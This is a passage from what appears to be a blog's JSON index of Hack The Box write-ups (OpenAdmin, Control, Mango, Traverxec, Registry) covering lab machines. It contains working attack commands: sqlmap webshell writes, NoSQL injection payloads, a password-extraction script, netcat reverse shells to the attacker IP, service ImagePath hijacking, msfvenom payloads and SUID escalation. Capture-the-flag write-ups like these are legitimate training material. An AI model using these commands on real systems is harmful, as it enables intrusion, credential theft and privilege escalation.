SSH shell:root@kali:~/htb/openadmin# ssh jimmy@10.10.10.171jimmy@10.10.10.171's password: jimmy@openadmin:~$ iduid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)Escalating to user joannaLooking at the Apache2 configuration, I see there’s an internal website running on port 52846.$ ls -l /etc/apache2/sites-available/*-rw-r--r-- 1 root root 6338 Jul 16 18:14 /etc/apache2/sites-available/default-ssl.conf-rw-r--r-- 1 root root  303 Nov 23 17:13 /etc/apache2/sites-available/internal.conf-rw-r--r-- 1 root root 1329 Nov 22 14:24 /etc/apache2/sites-available/openadmin.conf$ cat /etc/apache2/sites-available/internal.confListen 127.0.0.1:52846&lt;VirtualHost 127.0.0.1:52846&gt;    ServerName internal.openadmin.htb    DocumentRoot /var/www/internal&lt;IfModule mpm_itk_module&gt;AssignUserID joanna joanna&lt;/IfModule&gt;    ErrorLog ${APACHE_LOG_DIR}/error.log    CustomLog ${APACHE_LOG_DIR}/access.log combined&lt;/VirtualHost&gt;The index.php file contains the username and SHA512 hash of the password.&lt;h2&gt;Enter Username and Password&lt;/h2&gt;      &lt;div class = \"container form-signin\"&gt;        &lt;h2 class=\"featurette-heading\"&gt;Login Restricted.&lt;span class=\"text-muted\"&gt;&lt;/span&gt;&lt;/h2&gt;          &lt;?php            $msg = '';            if (isset($_POST['login']) &amp;&amp; !empty($_POST['username']) &amp;&amp; !empty($_POST['password'])) {              if ($_POST['username'] == 'jimmy' &amp;&amp; hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {                  $_SESSION['username'] = 'jimmy';                  header(\"Location: /main.php\");              } else {                  $msg = 'Wrong username or password.';              }            }         ?&gt;      &lt;/div&gt;The user is using a common password so the hash has already been cracked and I can do a search online and find the password: RevealedI’ll reconnect my SSH session with port-forwarding so I can access the local site: ssh jimmy@10.10.10.171 -L 52846:127.0.0.1:52846The internal site contains the SSH private key for the joanna user. It’s encrypted but I can crack it easily with john the ripper:root@kali:~/htb/openadmin# ssh -i id_rsa joanna@10.10.10.171Enter passphrase for key 'id_rsa': [...]joanna@openadmin:~$ cat user.txtc9b2cf07d[...]Root priv escjoanna@openadmin:~$ sudo -lMatching Defaults entries for joanna on openadmin:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser joanna may run the following commands on openadmin:    (ALL) NOPASSWD: /bin/nano /opt/privnano is running as root, this is our way in. Looking at GTFObins, I see an easy way to get a shell as root:I’ll use the first method to gain a root shell."
  },
  
  {
    "title": "Control - Hack The Box",
    "url": "/posts/htb-writeup-control/",
    "categories": "hackthebox, infosec",
    "tags": "x-forwarded-for, sqli, php, mysql, services",
    "date": "2020-04-25 00:00:00 +0800",
    





    
    "snippet": "Control runs a vulnerable PHP web application that controls access to the admin page by checking the X-Forwarded-For HTTP header. By adding the X-Forwarded-For HTTP header with the right IP address...",
    "content": "Control runs a vulnerable PHP web application that controls access to the admin page by checking the X-Forwarded-For HTTP header. By adding the X-Forwarded-For HTTP header with the right IP address we can access the admin page and exploit an SQL injection to write a webshell and get RCE. After pivoting to another user with the credentials found in the MySQL database, we get SYSTEM access by modifying an existing service configuration from the registry.Summary  There’s an SQL injection in a PHP page of the main web application that leads to writing a webshell  After getting an initial shell, we find additonal credentials by checking the MySQL database  Using the user Hector, we find that some of the registry entries for some services are writable by user Hector  By replacing the configuration of the SecLogon service, we can get RCE as SYSTEMPortscanroot@kali:~# nmap -p- 10.10.10.167 -sC -sVStarting Nmap 7.80 ( https://nmap.org ) at 2019-11-25 19:46 ESTNmap scan report for control.htb (10.10.10.167)Host is up (0.017s latency).Not shown: 65530 filtered portsPORT      STATE SERVICE VERSION80/tcp    open  http    Microsoft IIS httpd 10.0| http-methods: |_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: Fidelity135/tcp   open  msrpc   Microsoft Windows RPC3306/tcp  open  mysql?| fingerprint-strings: |   DNSStatusRequestTCP, DNSVersionBindReqTCP, HTTPOptions, Help, RTSPRequest: |_    Host '10.10.14.51' is not allowed to connect to this MariaDB server49666/tcp open  msrpc   Microsoft Windows RPC49667/tcp open  msrpc   Microsoft Windows RPCService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 163.51 secondsWifidelity websiteHere we have a generic corporate website with about and admin links at the top.Whenever I click on Admin or Login I get an error about a missing header.On the main HTML page source code there’s some kind of hint about a new payment system and an IP address. The IP address seems pretty interesting since we could use this in a HTTP header such as X-Forwarded-For to indicate to a backend server the source of the HTTP connection.The function.php file also contains a bunch of interesting PHP files:function deleteProduct(id) {\tdocument.getElementById(\"productId\").value = id;\tdocument.forms[\"viewProducts\"].action = \"delete_product.php\";\tdocument.forms[\"viewProducts\"].submit();}function updateProduct(id) {\tdocument.getElementById(\"productId\").value = id;\tdocument.forms[\"viewProducts\"].action = \"update_product.php\";\tdocument.forms[\"viewProducts\"].submit();}function viewProduct(id) {\tdocument.getElementById(\"productId\").value = id;\tdocument.forms[\"viewProducts\"].action = \"view_product.php\";\tdocument.forms[\"viewProducts\"].submit();}function deleteCategory(id) {\tdocument.getElementById(\"categoryId\").value = id;\tdocument.forms[\"categoryOptions\"].action = \"delete_category.php\";\tdocument.forms[\"categoryOptions\"].submit();}function updateCategory(id) {\tdocument.getElementById(\"categoryId\").value = id;\tdocument.forms[\"categoryOptions\"].action = \"update_category.php\";\tdocument.forms[\"categoryOptions\"].submit();}These appear to be used to interact with a database backend. I don’t know what they are used for yet but I’ll find out soon when I get access to the admin page.I also check with gobuster for any hidden directories or files:root@kali:~# gobuster dir -w /opt/SecLists/Discovery/Web-Content/big.txt -t 50 -x php -u http://10.10.10.167[...]/ADMIN.php (Status: 200)/Admin.php (Status: 200)/About.php (Status: 200)/Images (Status: 301)/Index.php (Status: 200)/about.php (Status: 200)/admin.php (Status: 200)/assets (Status: 301)/database.php (Status: 200)/images (Status: 301)/index.php (Status: 200)/uploads (Status: 301)===============================================================2019/11/25 20:10:56 Finished===============================================================The /uploads directory gives me a 403 Forbidden error message but if I can upload a file there later I might be able to get RCE that way.Getting access to the admin pageBy adding the X-Forwarded-For: 192.168.4.28 header in my HTTP requests, I can pass the verification check put in place on the website. Relying on the X-Forwarded-For header for authentication can be dangerous since anyone can set this header on any request they send out.With the header set, I’m able to access the admin portion of the website where I can search for products and update the inventory.SQL injectionThere’s an SQL injection vulnerability in the view_product.php page that can easily be exploited with sqlmap:sqlmap -H \"X-Forwarded-For: 192.168.4.28\" -u \"http://10.10.10.167/view_product.php\" --data \"productId=69\" --proxy=http://127.0.0.1:8080 --random-agentListing users with: sqlmap -H \"X-Forwarded-For: 192.168.4.28\" -u \"http://10.10.10.167/view_product.php\" --data \"productId=69\" --random-agent --passwords[*] hector [1]:    password hash: *0E178792E8FC304A2E3133D535D38CAF1DA3CD9D[*] manager [1]:    password hash: *CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA[*] root [1]:    password hash: *0A4A5CAD344718DC418035A1F4D292BA603134D8I’m able to crack the first two hashes:  hector: l33th4x0rhector  manager: l3tm3!nRCE using webshell upload with SQLiAfter messing with some of the sqlmap file-read and file-write options, I was able to write files to the upload directory with:sqlmap -u \"http://control.htb/view_product.php\" --data \"productId=69\" --file-write cmd.php --file-dest 'c:\\inetpub\\wwwroot\\uploads\\bobinette.php'So I’ve just uploaded a webshell to the box and can now run commands through PHP:Defender is running on this machine so my earlier attempst at uploading a meterpreter compiled EXE file failed and using the PHP meterpreter proved to be somewhat unstable. However I was able to generate an MSbuild XML meterpreter/reverse_tcp payload with GreatSCT and get a stable shell.First, I’ll upload the .xml file I’ve generated:sqlmap -u \"http://control.htb/view_product.php\" --data \"productId=69\" --file-write 9001.xml --file-dest 'c:\\inetpub\\wwwroot\\uploads\\9001.xml'Then compile and execute the payload using my webshell:curl 10.10.10.167/uploads/bobinette.php?c='C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe%20c:\\inetpub\\wwwroot\\uploads\\9001.xml'The flag is probably in Hector’s home directory but I don’t have access to it.meterpreter &gt; ls /usersListing: /users===============Mode              Size  Type  Last modified              Name----              ----  ----  -------------              ----40777/rwxrwxrwx   8192  dir   2019-11-05 07:34:03 -0500  Administrator40777/rwxrwxrwx   0     dir   2018-09-15 03:28:48 -0400  All Users40555/r-xr-xr-x   8192  dir   2018-09-15 02:09:26 -0400  Default40777/rwxrwxrwx   0     dir   2018-09-15 03:28:48 -0400  Default User40777/rwxrwxrwx   8192  dir   2019-11-01 05:09:15 -0400  Hector40555/r-xr-xr-x   4096  dir   2018-09-15 03:19:00 -0400  Public100666/rw-rw-rw-  174   fil   2018-09-15 03:16:48 -0400  desktop.inimeterpreter &gt; ls /users/hector[-] stdapi_fs_ls: Operation failed: Access is denied.Getting access as user HectorThere’s two easy ways to get a shell as Hector using the credentials found in the database:1.Port forward port 5985 and land a shell using WinRM2.Upload netcat and use powershell to execute it as user HectorCommand used:$user = 'fidelity\\hector'$pw = 'l33th4x0rhector'$secpw = ConvertTo-SecureString $pw -AsPlainText -Force$cred = New-Object System.Management.Automation.PSCredential $user,$secpwInvoke-Command -Computer localhost -Credential $cred -ScriptBlock {c:\\windows\\system32\\spool\\drivers\\color\\nc.exe 10.10.14.51 5555 -e cmd.exe}Priv esc using insecure ACLs on servicesI uploaded accesschk.exe and checked files and registry entries that I have access to. I noticed that I had Read/Write access to a lot of registry entries related to services.C:\\Users\\Hector\\Documents&gt;c:\\windows\\system32\\spool\\drivers\\color\\accesschk.exe \"Hector\" -kwsu HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services[...]RW HKLM\\System\\CurrentControlSet\\Services\\sdbus\\ParametersRW HKLM\\System\\CurrentControlSet\\Services\\SDFRdRW HKLM\\System\\CurrentControlSet\\Services\\SDFRd\\ParametersRW HKLM\\System\\CurrentControlSet\\Services\\SDFRd\\Parameters\\WdfRW HKLM\\System\\CurrentControlSet\\Services\\sdstorRW HKLM\\System\\CurrentControlSet\\Services\\sdstor\\ParametersRW HKLM\\System\\CurrentControlSet\\Services\\seclogonRW HKLM\\System\\CurrentControlSet\\Services\\seclogon\\ParametersRW HKLM\\System\\CurrentControlSet\\Services\\seclogon\\SecurityRW HKLM\\System\\CurrentControlSet\\Services\\SecurityHealthServiceRW HKLM\\System\\CurrentControlSet\\Services\\SEMgrSvcRW HKLM\\System\\CurrentControlSet\\Services\\SEMgrSvc\\ParametersRW HKLM\\System\\CurrentControlSet\\Services\\SEMgrSvc\\Security[...]To successfully get RCE as SYSTEM I need to find a service that matches the following criterias:  I can edit the registry entries with user Hector  I need to be able to start the service with user Hector  Is already configured to run as LocalSystemI can’t edit the service with sc config, probably because some permissions have been changed on the machine but I can change the same settings using reg add. After looking for a long time, I found the SecLogon service which satifies the conditions stated above.C:\\Users\\Hector\\Documents&gt;sc query seclogonsc query seclogonSERVICE_NAME: seclogon         TYPE               : 20  WIN32_SHARE_PROCESS          STATE              : 1  STOPPED         WIN32_EXIT_CODE    : 1077  (0x435)        SERVICE_EXIT_CODE  : 0  (0x0)        CHECKPOINT         : 0x0        WAIT_HINT          : 0x0C:\\Users\\Hector\\Documents&gt;reg query HKLM\\System\\CurrentControlSet\\Services\\seclogonHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\seclogon    Description    REG_SZ    @%SystemRoot%\\system32\\seclogon.dll,-7000    DisplayName    REG_SZ    @%SystemRoot%\\system32\\seclogon.dll,-7001    ErrorControl    REG_DWORD    0x1    FailureActions    REG_BINARY    805101000000000000000000030000001400000001000000C0D4010001000000E09304000000000000000000    ImagePath    REG_EXPAND_SZ    %windir%\\system32\\svchost.exe -k netsvcs -p    ObjectName    REG_SZ    LocalSystem    RequiredPrivileges    REG_MULTI_SZ    SeTcbPrivilege\\0SeRestorePrivilege\\0SeBackupPrivilege\\0SeAssignPrimaryTokenPrivilege\\0SeIncreaseQuotaPrivilege\\0SeImpersonatePrivilege    Start    REG_DWORD    0x3    Type    REG_DWORD    0x20I’ll change the ImagePath of the service so it runs my netcat as SYSTEM.C:\\Users\\Hector\\Documents&gt;reg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\seclogon\" /t REG_EXPAND_SZ /v ImagePath /d \"c:\\windows\\system32\\spool\\drivers\\color\\nc.exe 10.10.14.51 8888 -e cmd.exe\" /fThe operation completed successfully.C:\\Users\\Hector\\Documents&gt;sc start seclogon"
  },
  
  {
    "title": "Mango - Hack The Box",
    "url": "/posts/htb-writeup-mango/",
    "categories": "hackthebox, infosec",
    "tags": "mango, nosql, jjs",
    "date": "2020-04-17 00:00:00 +0800",
    





    
    "snippet": "Mango was a medium box with a NoSQSL injection in the login page that allows us to retrieve the username and password. The credentials we retrieve through the injection can be used to SSH to the bo...",
    "content": "Mango was a medium box with a NoSQSL injection in the login page that allows us to retrieve the username and password. The credentials we retrieve through the injection can be used to SSH to the box. For privilege escalation, the jjs tool has the SUID bit set so we can run scripts as root.Summary  There’s an authentication page using MangoDB that is vulnerable to NoSQL injection  We can extract the username and passwords for two accounts: mango and admin  Using the recovered password, we can SSH as mango then su to admin  The jjs java utility is installed and is SUID root so we can execute anything as rootPortscanroot@kali:~/htb# nmap -T4 -p- 10.10.10.162Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-27 21:47 EDTNmap scan report for mango.htb (10.10.10.162)Host is up (0.040s latency).Not shown: 65532 closed portsPORT    STATE SERVICE22/tcp  open  ssh80/tcp  open  http443/tcp open  httpsRecon - HTTPUsing the IP address I get a Forbidden error message when I try to access the site on port 80.I tried using mango.htb but I get the same error message.Nothing shows up when fuzzing files and directories:root@kali:~/htb# rustbuster dir -w /opt/SecLists/Discovery/Web-Content/big.txt -e php -u http://mango.htb --no-banner -S 400,401,403,404~ rustbuster v3.0.3 ~ by phra &amp; ps1dr3x ~[?] Started at\t: 2019-10-27 20:47:41  [00:02:45] ########################################   40908/40908   ETA: 00:00:00 req/s: 24Recon - HTTPSThe page on port 443 is different: It looks like a Google page but anytime I try to search for something I get Search Results: 0 results foundThere’s an analytics page that shows some kind of javascript application and there’s an error message about an invalid license.As far as I can see this is a local application and nothing I do gets sent to the server. It’s probably safe to skip that one for now.Nothing else shows up when fuzzing files and directories:root@kali:~/htb# rustbuster dir -w /opt/SecLists/Discovery/Web-Content/big.txt -e php -k -u https://mango.htb --no-banner -S 400,401,403,404~ rustbuster v3.0.3 ~ by phra &amp; ps1dr3x ~[?] Started at\t: 2019-10-27 20:47:52GET     200 OK                          https://mango.htb/analytics.phpGET     200 OK                          https://mango.htb/index.php  [00:02:42] ########################################   40908/40908   ETA: 00:00:00 req/s: 252Fuzzing vhosts to find the staging siteI found the staging-order.mango.htb site by fuzzing the vhosts.root@kali:~# ffuf -w ~/tools/SecLists/Discovery/DNS/dns-Jhaddix.txt -H \"Host: FUZZ.mango.htb\" -fc 400,403 -u http://10.10.10.162[...]staging-order           [Status: 200, Size: 4022, Words: 447, Lines: 210]There’s a login page with a non-functional Forgot Password button.NoSQL injection on the login pageI ran SQLmap and looked for SQL injections on the login page but couldn’t find any. I also tried a bunch of simple user/passwords combos in case it’s something really simple. Before going to bruteforce I thought I’d try some MangoDB injection since the name of the box looks like a hint.I’ll use the NoSQL injection page from PayloadsAllTheThings as a reference to try a few payloads.With username[$ne]=bob&amp;password[$ne]=invalid&amp;login=login I can set a negative comparison on the username and password and I notice that I get a 302 HTTP return code instead of a 200 like when I try invalid credentials. I’ve successfully bypassed the authentication page but the home.php I get redirected to doesn’t have anything on it.I’ll go back to the NoSQL injection and try to extract the usernames and passwords from the database. First, I’ll find the username by using the [$regex] operator so I can provide a regex inside of the username parameter.I already guessed that admin is a valid username so I don’t even need the regex for that one. The following evaluates to TRUE (returns a 302):username[$regex]=^admin$&amp;password[$ne]=invalid&amp;login=loginNext, I’ll try each letter of the alphabet like this:username[$regex]=^b.*$&amp;password[$ne]=invalid&amp;login=loginI find a username starting with letter m with:username[$regex]=^m.*$&amp;password[$ne]=invalid&amp;login=loginSo now I just need to guess each letter like:username[$regex]=^m.*$&amp;password[$ne]=invalid&amp;login=loginusername[$regex]=^ma.*$&amp;password[$ne]=invalid&amp;login=loginusername[$regex]=^man.*$&amp;password[$ne]=invalid&amp;login=loginusername[$regex]=^mang.*$&amp;password[$ne]=invalid&amp;login=loginusername[$regex]=^mango.*$&amp;password[$ne]=invalid&amp;login=loginSo I have mango and admin as valid usernames. Now it’s time to tackle the passwords for each account. I can find the password length by using something like this:Admin (12 characters): username=admin&amp;password[$regex]=^.{12}$&amp;login=loginMango (16 characters): username=mango&amp;password[$regex]=^.{16}$&amp;login=loginFor the password, I can just the same technique manually or write a simple script like the following to automate the process:#!/usr/bin/env python3import reimport requestsimport stringchars = string.ascii_letters + string.digits + string.punctuationprint(f\"Charset {chars}\")url = \"http://staging-order.mango.htb/\"p = \"\"while True:    print(p)    for x in chars:        data = {            \"username\": \"admin\",            \"password[$regex]\": f\"^{re.escape(p+x)}.*$\",            \"login\": \"login\"        }        r = requests.post(url, data=data, proxies={\"http\":\"127.0.0.1:8080\"}, allow_redirects=False)        if r.status_code == 302:            p += x            breakroot@kali:~/htb/mango# ./mango.py Charset abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!\"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\]^_`{|}~tt9t9Kt9Kct9KcSt9KcS3t9KcS3&gt;t9KcS3&gt;!t9KcS3&gt;!0t9KcS3&gt;!0Bt9KcS3&gt;!0B#t9KcS3&gt;!0B#2t9KcS3&gt;!0B#2I just replace admin by mango and run it again. I got the following passwords now:admin: t9KcS3&gt;!0B#2mango: h3mXK8RhU~f{]f5HGetting a shell as user adminI can SSH to the machine and su to admin since I also have the password for that user:Privesc using jjsWith LinEnum.sh I see there’s a SUID file for jjs:admin@mango:/home/admin$ curl 10.10.14.11/LinEnum.sh | sh  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100 46108  100 46108    0     0   229k      0 --:--:-- --:--:-- --:--:--  228k-e #########################################################-e # Local Linux Enumeration &amp; Privilege Escalation Script #-e #########################################################-e # www.rebootuser.com-e # version 0.98[...]-e [+] Possibly interesting SUID files:-rwsr-sr-- 1 root admin 10352 Jul 18 18:21 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs-e A quick search on GTFObins shows that we can execute commands with jjs.I can quickly get the root flag with:Or get a proper shell by generating a meterpreter shell with the PrependSetuid option:root@kali:~/htb/mango# msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o met LHOST=10.10.14.11 LPORT=4444 PrependSetuid=true[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload[-] No arch selected, selecting arch: x64 from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 146 bytesFinal size of elf file: 266 bytesSaved as: metOr, a faster way to get a root shell is to make bash SUID:admin@mango:/home/admin$ jjsWarning: The jjs tool is planned to be removed from a future JDK releasejjs&gt; Java.type('java.lang.Runtime').getRuntime().exec('chmod u+s /bin/bash').waitFor()0jjs&gt; admin@mango:/home/admin$ /bin/bash -pbash-4.4# iduid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)"
  },
  
  {
    "title": "Traverxec - Hack The Box",
    "url": "/posts/htb-writeup-traverxec/",
    "categories": "hackthebox, infosec",
    "tags": "nostromo, journalctl, gtfobins",
    "date": "2020-04-11 00:00:00 +0800",
    





    
    "snippet": "Sometimes you need a break from the hard boxes that take forever to pwn. Traverxec is an easy box that start with a custom vulnerable webserver with an unauthenticated RCE  that we exploit to land ...",
    "content": "Sometimes you need a break from the hard boxes that take forever to pwn. Traverxec is an easy box that start with a custom vulnerable webserver with an unauthenticated RCE  that we exploit to land an initial shell. After pivoting to another user by finding his SSH private key and cracking it, we get root through the less pager invoked by journalctl running as root through sudo.PortscanWe start with our basic portscan of the box and the attack surface seems pretty limited as we only have a webserver running and the SSH daemon. Easy boxes often have vulnerabilities that are easily exploited through off-the-self exploit on Exploit-DB. We note here that the Server header returned is nostromo 1.9.6, not Apache or Nginx.Exploiting Nostromo’s webserverThe website is a simple static webpage template. There’s a contact form at the bottom of the page but it’s not doing anything.Looking at the Exploit-DB database, we see there’s an exploit matching the exact version we saw earlier on the nmap scan.The box has the netcat version with the -e flag so we can get a reverse shell that way.Obtaining SSH keys for user DavidLooking at the nostromo configuration, we see that home directories are enabled so local users on the box probably have a /public_www directory in their home folder.Looking at David’s home directory, we can see that we don’t have access to the directory itself but if we go one level deeper to public_www then we see that the webserver has access to it. Since the webserver is running as the www-data user, it makes sense that this user would have access to the directory hosting the webpage files for users.That backup ssh file looks promising so we’ll copy this to our machine with netcat, extract it and then we see it contains the private and public SSH keys. The private key is encrypted so we’ll have to crack it.Using John and the rockyou wordlists, we’re able to find that the password is hunterWe can now log in to the server as user david with his RSA private key.PrivescThere’s a server-stats.sh file in David’s bin folder that sudo runs the journalctl command to view the last 5 log entries for the nostromo service.Looking at GTFOBins, we can see that the journalctl command can be used to execute arbitrary commands since it uses the less pager.To exploit this, we must make the pager pause before listing the 5 entries in the log file, so we can type !/bin/sh and get a root shell. There’s a couple of way to do this.By resizing with Gnome Terminator windows manually, I can force the stty rows to be updated.Or we can also resize the width of the terminal, this’ll make less pause as wellFinally, we can also set the stty rows manually like this:"
  },
  
  {
    "title": "Registry - Hack The Box",
    "url": "/posts/htb-writeup-registry/",
    "categories": "hackthebox, infosec",
    "tags": "docker, registry, restic, unintended",
    "date": "2020-04-03 00:00:00 +0800",
    





    
    "snippet": "This writeup is outdated and the attack path presented for user bolt has been patched. Initially once we pivoted from the bolt user to www-data we could run restic as root and abuse the sftp.comman...",
    "content": "This writeup is outdated and the attack path presented for user bolt has been patched. Initially once we pivoted from the bolt user to www-data we could run restic as root and abuse the sftp.command parameter to execute any command as root.Portscanroot@kali:~# nmap -T4 -sC -sV -p- 10.10.10.159Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-20 19:05 EDTNmap scan report for registry.htb (10.10.10.159)Host is up (0.044s latency).Not shown: 65532 closed portsPORT    STATE SERVICE  VERSION22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)80/tcp  open  http     nginx 1.14.0 (Ubuntu)|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: Welcome to nginx!443/tcp open  ssl/http nginx 1.14.0 (Ubuntu)|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: Welcome to nginx!| ssl-cert: Subject: commonName=docker.registry.htb| Not valid before: 2019-05-06T21:14:35|_Not valid after:  2029-05-03T21:14:35Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 34.27 secondsWebsiteThere’s a default nginx page shown on both port 80 and port 443:The SSL certificate contains docker.registry.htb which I’ll add to my /etc/hosts file.Website dirbustroot@kali:~# rustbuster dir -w /opt/SecLists/Discovery/Web-Content/big.txt -e php --no-banner \\&gt; -u http://registry.htb~ rustbuster v3.0.3 ~ by phra &amp; ps1dr3x ~[?] Started at\t: 2019-10-20 19:09:36GET\t403 Forbidden\t\t\thttp://registry.htb/.bash_historyGET     403 Forbidden                   http://registry.htb/.htaccessGET     403 Forbidden                   http://registry.htb/.htpasswdGET     200 OK                          http://registry.htb/backup.phpGET     301 Moved Permanently           http://registry.htb/install\t\t\t\t\t\t=&gt; http://registry.htb/install/The /backup.php page doesn’t display anything with my web browser. Maybe it’s supposed to be included as part of another file or it does something in the background but doesn’t output anything.The /install link shows a bunch of gibberish so it’s probably a binary file that I’m supposed to download and analyze.Hint from the compressed archiveI figure out that it’s a compressed file by running file then I can extract it and see it contains a certificate and a readme file.root@kali:~/htb/registry# file installinstall: gzip compressed data, last modified: Mon Jul 29 23:38:20 2019root@kali:~/htb/registry# mv install install.tar.gzroot@kali:~/htb/registry# tar xvf install.tar.gz gzip: stdin: unexpected end of fileca.crtreadme.mdtar: Child returned status 1tar: Error is not recoverable: exiting nowreadme.md contains some kind of hint as to what the box is about: docker has a private registry software# Private Docker Registry- https://docs.docker.com/registry/deploying/- https://docs.docker.com/engine/security/certificates/Docker registryWhen I got to https://docker.registry.htb/ I just see a blank page so I’ll run gobuster again to find files.root@kali:~/htb/registry# rustbuster dir -w /opt/SecLists/Discovery/Web-Content/big.txt --no-banner \\&gt; -k -u https://docker.registry.htb~ rustbuster v3.0.3 ~ by phra &amp; ps1dr3x ~[?] Started at\t: 2019-10-20 19:19:10GET     301 Moved Permanently           https://docker.registry.htb/v2\t\t\t\t\t\t=&gt; /v2/The /v2 page has HTTP basic auth but I was able to guess the admin / admin credentials. However I get an empty JSON object when I query the page.root@kali:~/htb/registry# curl -u admin:admin -k https://docker.registry.htb/v2/{}I’m pretty sure this a Docker Registry installation based on the name of the box, the hint from the file and the directory discovered.To interact with the registry without doing API calls manually I’ll use the registry-cli tool.root@kali:~/htb/registry# registry.py -l admin:admin -r https://docker.registry.htb --no-validate-ssl---------------------------------Image: bolt-image  tag: latestThere’s a docker image called bolt-image present in the registry. I’ll download it to my own box so I can execute it and see if there is anything interesting in it.root@kali:~/htb/registry# docker login -u admin -p admin docker.registry.htbWARNING! Using --password via the CLI is insecure. Use --password-stdin.WARNING! Your password will be stored unencrypted in /root/.docker/config.json.Configure a credential helper to remove this warning. Seehttps://docs.docker.com/engine/reference/commandline/login/#credentials-storeLogin Succeededroot@kali:~/htb/registry# docker pull docker.registry.htb/bolt-image:latestlatest: Pulling from bolt-imagef476d66f5408: Pull complete 8882c27f669e: Pull complete d9af21273955: Pull complete f5029279ec12: Pull complete 2931a8b44e49: Pull complete c71b0b975ab8: Pull complete 02666a14e1b5: Pull complete 3f12770883a6: Pull complete 302bfcb3f10c: Pull complete Digest: sha256:eeff225e5fae33dc832c3f82fd8b0db363a73eac4f0f0cb587094be54050539bStatus: Downloaded newer image for docker.registry.htb/bolt-image:latestI’ll launch the container in interactive mode so I can look around easily:root@kali:~/htb/registry# docker image listREPOSITORY                       TAG                 IMAGE ID            CREATED             SIZEanoxis/registry-cli              latest              c8ecf313a6be        2 months ago        73.6MBdocker.registry.htb/bolt-image   latest              601499e98a60        4 months ago        362MBroot@kali:~/htb/registry# docker run -ti 601499e98a60 /bin/bashroot@4195e2eb99fe:/# There’s an encrypted SSH private key in /root/.ssh:root@4195e2eb99fe:~/.ssh# cat id_rsa-----BEGIN RSA PRIVATE KEY-----Proc-Type: 4,ENCRYPTEDDEK-Info: AES-128-CBC,1C98FA248505F287CCC597A59CF83AB9KF9YHXRjDZ35Q9ybzkhcUNKF8DSZ+aNLYXPL3kgdqlUqwfpqpbVdHbMeDk7qbS7wKhUv4Gj22O1t3koy9z0J0LpVM8NLMgVZhTj1eAlJO72dKBNNv5D4qkIDANmZeAGv[...]RLI9xScv6aJan6xHS+nWgxpPA7YNo2rknk/ZeUnWXSTLYyrC43dyPS4FvG8N0H1V94Vcvj5Kmzv0FxwVu4epWNkLTZCJPBszTKiaEWWS+OLDh7lrcmm+GP54MsLBWVpr-----END RSA PRIVATE KEY-----There’s a profile file containing the SSH password for the private key:root@4195e2eb99fe:/etc/profile.d# ls -ltotal 8-rw-r--r-- 1 root root  96 Aug 20  2018 01-locale-fix.sh-rwxr-xr-x 1 root root 222 May 25 01:25 01-ssh.shroot@4195e2eb99fe:/etc/profile.d# cat 01-ssh.sh #!/usr/bin/expect -f#eval `ssh-agent -s`spawn ssh-add /root/.ssh/id_rsaexpect \"Enter passphrase for /root/.ssh/id_rsa:\"send \"GkOcz221Ftb3ugog\\n\";expect \"Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)\"interactPassword is: GkOcz221Ftb3ugogThere’s also a sync.sh but it doesn’t seem to do anything:root@4195e2eb99fe:/var/www/html# cat sync.sh#!/bin/bashrsync -azP registry:/var/www/html/bolt .Login in as user boltWith the private key and password I found I’m able to SSH to the box with the user bolt:root@kali:~/htb/registry# ssh -i id_rsa bolt@10.10.10.159Enter passphrase for key 'id_rsa': Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-29-generic x86_64)Last login: Sun Oct 20 23:05:17 2019 from 10.10.14.20bolt@bolt:~$ iduid=1001(bolt) gid=1001(bolt) groups=1001(bolt)bolt@bolt:~$ cat user.txtytc0ytdmnzywnzgxngi0zte0otm3ywziEnumeration as user boltThe backup.php file I found earlier executes a backup application with sudo:bolt@bolt:/var/www/html$ cat backup.php&lt;?php shell_exec(\"sudo restic backup -r rest:http://backup.registry.htb/bolt bolt\");Unfortunately my current bolt doesn’t have rights to sudo that specific command but I have the following:bolt@bolt:/var/www/html$ sudo -lMatching Defaults entries for bolt on bolt:    env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser bolt may run the following commands on bolt:    (git) NOPASSWD: /usr/bin/git checkout *Escalating to www-data using the git post-checkout hooksSince I can execute git checkout as user git I can exploit the post-checkout hooks to get RCE. I’ll just create 